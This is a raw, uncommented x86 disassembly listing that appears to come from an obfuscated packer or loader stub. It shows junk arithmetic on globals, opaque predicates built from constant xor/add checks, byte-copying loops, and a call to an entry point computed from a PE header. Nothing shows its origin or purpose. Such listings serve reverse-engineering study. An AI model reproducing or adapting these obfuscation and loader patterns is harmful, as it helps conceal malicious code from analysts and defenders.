  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x430a24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x430a28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af51
  41c85f:	mov    eax,ds:0x42af5d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427c81
  41d28a:	mov    ecx,DWORD PTR ds:0x429d45
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
